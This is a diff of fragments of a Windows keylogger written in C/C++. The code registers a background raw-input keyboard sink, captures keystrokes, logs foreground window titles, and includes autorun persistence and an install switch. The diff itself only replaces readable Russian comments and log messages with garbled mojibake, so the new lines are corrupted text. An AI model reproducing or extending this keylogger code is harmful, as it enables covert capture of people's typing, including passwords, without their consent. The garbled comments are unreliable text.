@@ -12,7 +12,7 @@ HANDLE hMutex;
 typedef BOOL(WINAPI*fnAddClipboardFormatListener)(HWND hwnd);
 
 /*
-	Запись в лог
+	Г‡Г ГЇГЁГ±Гј Гў Г«Г®ГЈ
 */
 void appendLog(LPCWSTR str)
 {
@@ -21,7 +21,7 @@ void appendLog(LPCWSTR str)
 }
 
 /*
-	Резолвинг клавиш
+	ГђГҐГ§Г®Г«ГўГЁГ­ГЈ ГЄГ«Г ГўГЁГё
 */
 void resolveKey(USHORT key, bool pressed)
 {
@@ -165,7 +165,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 	case WM_CREATE:
 
 		RAWINPUTDEVICE rid;
-		rid.usUsage = 0x6; // клавиатура
+		rid.usUsage = 0x6; // ГЄГ«Г ГўГЁГ ГІГіГ°Г 
 		rid.usUsagePage = 0x1;
 		rid.hwndTarget = hwnd;
 		rid.dwFlags = RIDEV_INPUTSINK;
@@ -174,17 +174,17 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 		break;
 
 	case WM_INPUT:
-		GetWindowTextW(GetForegroundWindow(), currWin, 256); // проверяем, изменилось ли переднее окно
+		GetWindowTextW(GetForegroundWindow(), currWin, 256); // ГЇГ°Г®ГўГҐГ°ГїГҐГ¬, ГЁГ§Г¬ГҐГ­ГЁГ«Г®Г±Гј Г«ГЁ ГЇГҐГ°ГҐГ¤Г­ГҐГҐ Г®ГЄГ­Г®
 		if (lstrcmpW(lastWin, currWin) != 0){
 			appendLog(L"\n[");
-			appendLog(currWin);	// пишем в лог 
+			appendLog(currWin);	// ГЇГЁГёГҐГ¬ Гў Г«Г®ГЈ 
 			appendLog(L"]:\n");
 			lstrcpyW(lastWin, currWin);
 		}
 
 		{
 			DWORD size = sizeof(rawData);
-			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, (LPVOID)&rawData, (LPUINT)&size, sizeof(RAWINPUTHEADER)); // получаем ввод с клавиатуры
+			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, (LPVOID)&rawData, (LPUINT)&size, sizeof(RAWINPUTHEADER)); // ГЇГ®Г«ГіГ·Г ГҐГ¬ ГўГўГ®Г¤ Г± ГЄГ«Г ГўГЁГ ГІГіГ°Г»
 			resolveKey(rawData.data.keyboard.VKey, (rawData.data.keyboard.Message == WM_KEYDOWN ||
 				rawData.data.keyboard.Message == WM_SYSKEYDOWN) ? true : false);
 
@@ -230,7 +230,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 }
 
 /*
-	Закрепление
+	Г‡Г ГЄГ°ГҐГЇГ«ГҐГ­ГЁГҐ
 */
 void setAutorun()
 {
@@ -268,7 +268,7 @@ void setAutorun()
 }
 
 /*
-	Инициализация при запуске
+	Г€Г­ГЁГ¶ГЁГ Г«ГЁГ§Г Г¶ГЁГї ГЇГ°ГЁ Г§Г ГЇГіГ±ГЄГҐ
 */
 bool initK()
 {
@@ -302,9 +302,9 @@ bool initK()
 }
 
 /*
-	Установка
+	Г“Г±ГІГ Г­Г®ГўГЄГ 
 
-	Прим. Установка выполняется при запуске с ключом -i
+	ГЏГ°ГЁГ¬. Г“Г±ГІГ Г­Г®ГўГЄГ  ГўГ»ГЇГ®Г«Г­ГїГҐГІГ±Гї ГЇГ°ГЁ Г§Г ГЇГіГ±ГЄГҐ Г± ГЄГ«ГѕГ·Г®Г¬ -i
 */
 bool install()
 {
@@ -323,11 +323,11 @@ int WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int nCmdShow)
 
 	if (argc > 1)
 	{
-		if (lstrcmpW(argv[1], L"-i") == 0){ // только установка
+		if (lstrcmpW(argv[1], L"-i") == 0){ // ГІГ®Г«ГјГЄГ® ГіГ±ГІГ Г­Г®ГўГЄГ 
 			install();
 			return 0;
 		}
-		else if (lstrcmpW(argv[1], L"-iR")) // установка и выполнение
+		else if (lstrcmpW(argv[1], L"-iR")) // ГіГ±ГІГ Г­Г®ГўГЄГ  ГЁ ГўГ»ГЇГ®Г«Г­ГҐГ­ГЁГҐ
 			install();
 	}
 
@@ -349,13 +349,13 @@ int WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int nCmdShow)
 
 	if (!RegisterClassExW(&wc))
 	{
-		appendLog(L"Не удалось зарегать класс!\n");
+		appendLog(L"ГЌГҐ ГіГ¤Г Г«Г®Г±Гј Г§Г Г°ГҐГЈГ ГІГј ГЄГ«Г Г±Г±!\n");
 		return 0;
 	}
 
 	if (!(hwnd = CreateWindowExW(0, MyClassName, NULL, 0, 0, 0, 0, 0, 0, NULL, hInstance, NULL)))
 	{
-		appendLog(L"Не удалось создать окно!\n");
+		appendLog(L"ГЌГҐ ГіГ¤Г Г«Г®Г±Гј Г±Г®Г§Г¤Г ГІГј Г®ГЄГ­Г®!\n");
 		return 0;
 	}
 
